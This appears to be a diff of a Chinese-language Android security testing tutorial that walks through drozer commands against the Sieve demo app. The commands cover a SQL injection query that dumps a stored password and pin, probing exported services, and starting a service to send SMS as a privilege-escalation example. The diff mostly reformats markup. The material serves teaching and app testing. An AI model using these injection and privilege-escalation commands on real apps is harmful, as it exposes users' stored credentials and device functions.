@@ -219,7 +219,7 @@ enable</p></li>
 <code>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"</code></p>
 
 <pre><code>  | Password          | pin  |
-  | lina2015 | 2015 |
+  | lina2015          | 2015 |
 </code></pre>
 
 <p>5）同时检测SQL注入和目录遍历<br/>
@@ -269,34 +269,40 @@ enable</p></li>
 
 <p>两个service都是exported。<br/>
 2)service 模块<br/>
-<code>dz&gt; cd app</code> <br/>
-<code>dz#app&gt; cd service</code> <br/>
-<code>dz#app.service&gt; ls</code></p>
+<code>dz&gt; cd app</code></p></li>
+</ol>
 
-<pre><code>  app.service.info   Get information about exported services                      
-  app.service.send   Send a Message to a service, and display the reply           
-  app.service.start  Start Service                                                
-  app.service.stop   Stop Service 
+
+<p><code>dz#app&gt; cd service</code></p>
+
+<p><code>dz#app.service&gt; ls</code></p>
+
+<pre><code>    app.service.info   Get information about exported services                      
+    app.service.send   Send a Message to a service, and display the reply           
+    app.service.start  Start Service                                                
+    app.service.stop   Stop Service 
 </code></pre>
 
 <p>查看具体使用<br/>
 <code>dz#app.service&gt; help app.service.send</code></p>
 
-<pre><code>  usage: run app.service.send [-h] [--msg what arg1 arg2] [--extra type key value]
-  [--no-response] [--timeout TIMEOUT] [--bundle-as-obj]
-  package component
+<pre><code>    usage: run app.service.send [-h] [--msg what arg1 arg2] [--extra type key value]
+    [--no-response] [--timeout TIMEOUT] [--bundle-as-obj]
+    package component
 </code></pre>
 
 <p>向某个服务发送消息<br/>
 <code>dz#app.service&gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService --msg 1 5 3</code></p>
 
-<pre><code>  Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.CryptoService:
-  what: 111111
-  arg1: 0
-  arg2: 0
-  Empty
-</code></pre></li>
-<li><p>intent组件触发（拒绝服务，权限提升）<br/>
+<pre><code>    Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.CryptoService:
+    what: 111111
+    arg1: 0
+    arg2: 0
+    Empty
+</code></pre>
+
+<ol>
+<li>intent组件触发（拒绝服务，权限提升）<br/>
 利用intent对组件的触发一般有两类漏洞，一类拒绝服务，一类权限提升。拒绝服务危害性较低，主要影响应用服务质量；权限提升会使得没有该权限的应用可以通过intent触发拥有该权限的应用，帮助其完成越权行为。<br/>
 1) 查看暴露的广播组件信息  <br/>
 <code>run app.broadcast.info -a com.package.name</code>　　获取broadcast receivers信息<br/>
@@ -311,7 +317,7 @@ enable</p></li>
 不使用drozer启动service<br/>
 <code>am startservice –n 包名/service名</code><br/>
 （2）权限提升  <br/>
-<code>run app.service.start --action com.test.vulnerability.SEND_SMS --extra string dest 11111 --extra string text 1111 --extra string OP SEND_SMS</code></p></li>
+<code>run app.service.start --action com.test.vulnerability.SEND_SMS --extra string dest 11111 --extra string text 1111 --extra string OP SEND_SMS</code></li>
 <li><p>文件操作<br/>
 列出指定文件路径里全局可读/写的文件
 <code>dz&gt; run tools.setup.busybox</code></p>
